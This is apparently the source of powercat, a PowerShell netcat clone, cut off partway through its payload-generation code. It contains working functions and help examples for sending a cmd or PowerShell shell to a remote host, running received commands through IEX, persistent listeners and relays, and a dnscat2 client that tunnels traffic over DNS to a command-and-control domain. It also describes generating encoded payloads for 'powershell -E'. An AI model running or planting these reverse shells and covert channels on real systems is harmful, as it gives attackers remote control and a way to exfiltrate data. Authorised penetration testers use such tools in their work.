function powercat
{
  param(
    [alias("Client")][string]$c="",
    [alias("Listen")][switch]$l=$False,
    [alias("Port")][Parameter(Position=-1)][string]$p="",
    [alias("Execute")][string]$e="",
    [alias("ExecutePowershell")][switch]$ep=$False,
    [alias("Relay")][string]$r="",
    [alias("UDP")][switch]$u=$False,
    [alias("dnscat2")][string]$dns="",
    [alias("DNSFailureThreshold")][int32]$dnsft=10,
    [alias("Timeout")][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
    [alias("OutputFile")][string]$of="",
    [alias("Disconnect")][switch]$d=$False,
    [alias("Repeater")][switch]$rep=$False,
    [alias("GeneratePayload")][switch]$g=$False,
    [alias("GenerateEncoded")][switch]$ge=$False,
    [alias("Help")][switch]$h=$False
  )
  
  ############### HELP ###############
  $Help = "
powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat

This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: powercat [-c or -l] [-p port] [options]

  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.
            
  -l              Listen Mode. Start a listener on the port specified by -p.
  
  -p  <port>      Port. The port to connect to, or the port to listen on.
  
  -e  <proc>      Execute. Specify the name of the process to start.
  
  -ep             Execute Powershell. Start a pseudo powershell session. You can
                  declare variables and execute commands, but if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.
            
  -r  <str>       Relay. Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
                  Listener Relay Format: -r <protocol>:<port>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
            
  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                  must send data before the server can respond.
            
  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                  Specify the dns server to -c, the dns port to -p, and specify the 
                  domain to this option, -dns. This is only a client.
                  Get the server here: https://github.com/iagox86/dnscat2
            
  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                  recieve before exiting. Set to zero when receiving files, and set high
                  for more stability over the internet.
            
  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                  connecting. Default: 60
            
  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  established. Used for moving files. You can provide the path to a file,
                  a byte array object, or a string. You can also pipe any of those into
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
            
  -o  <type>      Output. Specify how powercat should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
            
  -of <path>      Output File.  Specify the path to a file to write output to.
            
  -d              Disconnect. powercat will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.
            
  -rep            Repeater. powercat will continually restart after it is disconnected.
                  Used for setting up a persistent server.
                  
  -g              Generate Payload.  Returns a script as a string which will execute the
                  powercat with the options you have specified. -i, -d, and -rep will not
                  be incorporated.
                  
  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>

  -h              Print this help message.

Examples:

  Listen on port 8000 and print the output to the console.
      powercat -l -p 8000
  
  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
      powercat -c 10.1.1.1 -p 443 -e cmd -v
  
  Connect to the dnscat2 server on c2.example.com, and send dns queries
  to the dns server on 10.1.1.1 port 53.
      powercat -c 10.1.1.1 -p 53 -dns c2.example.com
  
  Send a file to 10.1.1.15 port 8000.
      powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
  
  Write the data sent to the local listener on port 4444 to C:\outfile
      powercat -l -p 4444 -of C:\outfile
  
  Listen on port 8000 and repeatedly server a powershell shell.
      powercat -l -p 8000 -ep -rep
  
  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
      powercat -l -p 8000 -r tcp:10.1.1.1:9000
      
  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
  sending queries to 10.1.1.1 port 53.
      powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
"
  if($h){return $Help}
  ############### HELP ###############
  
  ############### VALIDATE ARGS ###############
  $global:Verbose = $Verbose
  if($of -ne ''){$o = 'Bytes'}
  if($dns -eq "")
  {
    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
    if($p -eq ""){return "Please provide a port number to -p."}
  }
  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  if($r -ne "")
  {
    if($r.split(":").Count -eq 2)
    {
      $Failure = $False
      netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
      if($Failure){break}
    }
  }
  ############### VALIDATE ARGS ###############
  
  ############### UDP FUNCTIONS ###############
  function Setup_UDP
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $c,$l,$p,$t = $FuncSetupVars
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    if($l)
    {
      $SocketDestinationBuffer = New-Object System.Byte[] 65536
      $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
      $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
      Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
      $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
      $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
          {
            Write-Verbose "CTRL or ESC caught. Stopping UDP Setup..."
            $FuncVars["Socket"].Close()
            $Stopwatch.Stop()
            break
          }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt $t)
        {
          $FuncVars["Socket"].Close()
          $Stopwatch.Stop()
          Write-Verbose "Timeout!" ; break
        }
        if($ConnectHandle.IsCompleted)
        {
          $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
          Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
          if($SocketBytesRead -gt 0){break}
          else{break}
        }
      }
      $Stopwatch.Stop()
      $FuncVars["InitialConnectionBytes"] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
    }
    else
    {
      if(!$c.Contains("."))
      {
        $IPList = @()
        [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
        Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
      }
      else
      {
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
      }
      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
      $FuncVars["Socket"].Connect($c,$p)
      Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
      Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
    }
    $FuncVars["BufferSize"] = 65536
    $FuncVars["EndPoint"] = $EndPoint
    $FuncVars["StreamDestinationBuffer"] = New-Object System.Byte[] $FuncVars["BufferSize"]
    $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
    return $FuncVars
  }
  function ReadData_UDP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Socket"].Client.EndReceiveFrom($FuncVars["StreamReadOperation"],[ref]$FuncVars["EndPoint"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
    }
    return $Data,$FuncVars
  }
  function WriteData_UDP
  {
    param($Data,$FuncVars)
    $FuncVars["Socket"].Client.SendTo($Data,$FuncVars["EndPoint"]) | Out-Null
    return $FuncVars
  }
  function Close_UDP
  {
    param($FuncVars)
    $FuncVars["Socket"].Close()
  }
  ############### UDP FUNCTIONS ###############
  
  ############### DNS FUNCTIONS ###############
  function Setup_DNS
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    function ConvertTo-HexArray
    {
      param($String)
      $Hex = @()
      $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
      return $Hex
    }
    
    function SendPacket
    {
      param($Packet,$DNSServer,$DNSPort)
      $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
      $result = ($Command | nslookup 2>&1 | Out-String)
      if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
      else{return 1}
    }
    
    function Create_SYN
    {
      param($SessionId,$SeqNum,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
    }
    
    function Create_FIN
    {
      param($SessionId,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
    }
    
    function Create_MSG
    {
      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
    }
    
    function DecodePacket
    {
      param($Packet)
      
      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
      $AcknowledgementNumber = ($Packet[10..13] -join "")
      $SeqNum = ($Packet[14..17] -join "")
      [byte[]]$ReturningData = @()
      
      if($Packet.Length -gt 18)
      {
        $PacketElim = $Packet.Substring(18)
        while($PacketElim.Length -gt 0)
        {
          $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
          $PacketElim = $PacketElim.Substring(2)
        }
      }
      
      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
    }
    
    function AcknowledgeData
    {
      param($ReturningData,$AcknowledgementNumber)
      $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
      return $Hex
    }
    $FuncVars = @{}
    $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
    if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
    $FuncVars["Tag"] = ""
    $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
    
    $FuncVars["Create_SYN"] = ${function:Create_SYN}
    $FuncVars["Create_MSG"] = ${function:Create_MSG}
    $FuncVars["Create_FIN"] = ${function:Create_FIN}
    $FuncVars["DecodePacket"] = ${function:DecodePacket}
    $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
    $FuncVars["AckData"] = ${function:AcknowledgeData}
    $FuncVars["SendPacket"] = ${function:SendPacket}
    $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Failures"] = 0
    
    $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
    $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
    $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
    if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
    $ReturningData = $DecodedPacket[1]
    if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
    $FuncVars["AckNum"] = $DecodedPacket[2]
    $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
    if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
    return $FuncVars
  }
  function ReadData_DNS
  {
    param($FuncVars)
    if($global:Verbose){$Verbose = $True}
    
    $PacketsData = @()
    $PacketData = ""
    
    if($FuncVars["InputData"] -ne $null)
    {
      $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
      $SectionCount = 0
      $PacketCount = 0
      foreach($Char in $Hex)
      {
        if($SectionCount -ge 30)
        {
          $SectionCount = 0
          $PacketData += "."
        }
        if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
        {
          $PacketsData += $PacketData.TrimEnd(".")
          $PacketCount = 0
          $SectionCount = 0
          $PacketData = ""
        }
        $PacketData += $Char
        $SectionCount += 2
        $PacketCount += 2
      }
      $PacketData = $PacketData.TrimEnd(".")
      $PacketsData += $PacketData
      $FuncVars["InputData"] = ""
    }
    else
    {
      $PacketsData = @("")
    }
    
    [byte[]]$ReturningData = @()
    foreach($PacketData in $PacketsData)
    {
      try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
      catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
      try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
      catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
      try
      {
        $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
        if($DecodedPacket.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
        $FuncVars["AckNum"] = $DecodedPacket[2]
        $FuncVars["SeqNum"] = $DecodedPacket[3]
        $ReturningData += $DecodedPacket[1]
      }
      catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
      if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
    }
    
    if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}
    
    if($ReturningData -ne @())
    {
      $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
    }
    return $ReturningData,$FuncVars
  }
  function WriteData_DNS
  {
    param($Data,$FuncVars)
    $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
    return $FuncVars
  }
  function Close_DNS
  {
    param($FuncVars)
    $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
    Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
  }
  ############### DNS FUNCTIONS ###############
  
  ########## TCP FUNCTIONS ##########
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    if(!$l)
    {
      $FuncVars["l"] = $False
      $Socket = New-Object System.Net.Sockets.TcpClient
      Write-Verbose "Connecting..."
      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
      $Socket = New-Object System.Net.Sockets.TcpListener $p
      $Socket.Start()
      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
    }
    
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
        {
          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
          if($FuncVars["l"]){$Socket.Stop()}
          else{$Socket.Close()}
          $Stopwatch.Stop()
          break
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){$Socket.Close()}
        else{$Socket.Stop()}
        $Stopwatch.Stop()
        Write-Verbose "Timeout!" ; break
        break
      }
      if($Handle.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            $Socket.EndConnect($Handle)
            $Stream = $Socket.GetStream()
            $BufferSize = $Socket.ReceiveBufferSize
            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
          }
          catch{$Socket.Close(); $Stopwatch.Stop(); break}
        }
        else
        {
          $Client = $Socket.EndAcceptTcpClient($Handle)
          $Stream = $Client.GetStream()
          $BufferSize = $Client.ReceiveBufferSize
          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){break}
    $FuncVars["Stream"] = $Stream
    $FuncVars["Socket"] = $Socket
    $FuncVars["BufferSize"] = $BufferSize
    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["StreamBytesRead"] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamBytesRead"] -eq 0){break}
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars["Stream"].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
    else{$FuncVars["Socket"].Close()}
  }
  ########## TCP FUNCTIONS ##########
  
  ########## CMD FUNCTIONS ##########
  function Setup_CMD
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
    $FuncVars["Process"].Start() | Out-Null
    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_CMD
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars["StdOutReadOperation"].IsCompleted)
    {
      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
      if($StdOutBytesRead -eq 0){break}
      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    }
    if($FuncVars["StdErrReadOperation"].IsCompleted)
    {
      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
      if($StdErrBytesRead -eq 0){break}
      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_CMD
  {
    param($Data,$FuncVars)
    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function Close_CMD
  {
    param($FuncVars)
    $FuncVars["Process"] | Stop-Process
  }  
  ########## CMD FUNCTIONS ##########
  
  ########## POWERSHELL FUNCTIONS ##########
  function Main_Powershell
  {
    param($Stream1SetupVars)   
    try
    {
      $encoding = New-Object System.Text.AsciiEncoding
      [byte[]]$InputToWrite = @()
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
    
      Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
      try
      {
        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
        $Prompt = ("PS " + (pwd).Path + "> ")
        $CommandToExecute = ""      
        $Data = $null
      }
      catch
      {
        Write-Verbose "Stream 2 Setup Failure" ; return
      }
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {        
        try
        {
          ##### Stream2 Read #####
          $Prompt = $null
          $ReturnedData = $null
          if($CommandToExecute -ne "")
          {
            try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
            catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | Out-String))}
            $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
          }
          $Data += $IntroPrompt
          $IntroPrompt = $null
          $Data += $ReturnedData
          $Data += $Prompt
          $CommandToExecute = ""
          ##### Stream2 Read #####

          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if($Data.Length -eq 0){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  ########## POWERSHELL FUNCTIONS ##########

  ########## CONSOLE FUNCTIONS ##########
  function Setup_Console
  {
    param($FuncSetupVars)
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Output"] = $FuncSetupVars[0]
    $FuncVars["OutputBytes"] = [byte[]]@()
    $FuncVars["OutputString"] = ""
    return $FuncVars
  }
  function ReadData_Console
  {
    param($FuncVars)
    $Data = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $Data = $FuncVars["Encoding"].GetBytes((Read-Host) + "`n")
    }
    return $Data,$FuncVars
  }
  function WriteData_Console
  {
    param($Data,$FuncVars)
    switch($FuncVars["Output"])
    {
      "Host" {Write-Host -n $FuncVars["Encoding"].GetString($Data)}
      "String" {$FuncVars["OutputString"] += $FuncVars["Encoding"].GetString($Data)}
      "Bytes" {$FuncVars["OutputBytes"] += $Data}
    }
    return $FuncVars
  }
  function Close_Console
  {
    param($FuncVars)
    if($FuncVars["OutputString"] -ne ""){return $FuncVars["OutputString"]}
    elseif($FuncVars["OutputBytes"] -ne @()){return $FuncVars["OutputBytes"]}
    return
  }
  ########## CONSOLE FUNCTIONS ##########
  
  ########## MAIN FUNCTION ##########
  function Main
  {
    param($Stream1SetupVars,$Stream2SetupVars)
    try
    {
      [byte[]]$InputToWrite = @()
      $Encoding = New-Object System.Text.AsciiEncoding
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }
      
      Write-Verbose "Setting up Stream 1..."
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
      
      Write-Verbose "Setting up Stream 2..."
      try{$Stream2Vars = Stream2_Setup $Stream2SetupVars}
      catch{Write-Verbose "Stream 2 Setup Failure" ; return}
      
      $Data = $null
      
      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }
      
      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
      
      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          $Data,$Stream2Vars = Stream2_ReadData $Stream2Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if(($Data.Length -eq 0) -or ($Data -eq $null)){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$Stream2Vars = Stream2_WriteData $Data $Stream2Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        #Write-Verbose "Closing Stream 2..."
        Stream2_Close $Stream2Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 2"
      }
      try
      {
        #Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  ########## MAIN FUNCTION ##########
  
  ########## GENERATE PAYLOAD ##########
  if($u)
  {
